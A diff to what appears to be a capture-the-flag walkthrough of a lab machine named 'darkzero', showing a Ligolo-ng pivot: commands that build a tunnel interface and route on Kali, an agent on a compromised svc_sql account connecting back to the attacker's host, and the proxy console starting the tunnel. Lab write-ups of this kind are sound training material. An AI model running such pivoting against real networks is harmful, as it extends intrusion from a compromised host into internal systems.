@@ -145,7 +145,7 @@ Setting up a Ligolo-ng tunnel to reach `172.16.20.0/24`:
 
 **On Kali (proxy):**
 ```bash
-sudo ip tuntap add user kali mode tun ligolo
+sudo ip tuntap add user 1dh4m mode tun ligolo
 sudo ip link set ligolo up
 sudo ip route add 172.16.20.0/24 dev ligolo
 
@@ -160,9 +160,27 @@ PS C:\users\svc_sql> ./agent -connect 10.10.16.3:11601 -ignore-cert
 
 **On Ligolo-ng console:**
 ```
+./proxy -selfcert
+INFO[0000] Loading configuration file ligolo-ng.yaml
+WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC!
+INFO[0000] Listening on 0.0.0.0:11601
+    __    _             __
+   / /   (_)___ _____  / /___        ____  ____ _
+  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
+ / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /
+/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /
+        /____/                          /____/
+
+  Made in France ♥            by @Nicocha30!
+  Version: 0.8.2
+
+ligolo-ng » INFO[0051] Agent joined.                                 id=00155df25c01 name="darkzero-ext\\svc_sql@DC02" remote="10.10.11.89:58145"
+ligolo-ng »
 ligolo-ng » session
-? Specify a session: 1 - darkzero-ext\svc_sql@DC02
+? Specify a session : 1 - darkzero-ext\svc_sql@DC02 - 10.10.11.89:58145 - 00155df25c01
 [Agent : darkzero-ext\svc_sql@DC02] » start
+INFO[0125] Starting tunnel to darkzero-ext\svc_sql@DC02 (00155df25c01)
+[Agent : darkzero-ext\svc_sql@DC02] »
 ```
 
 We now have a routed tunnel to `172.16.20.0/24`.
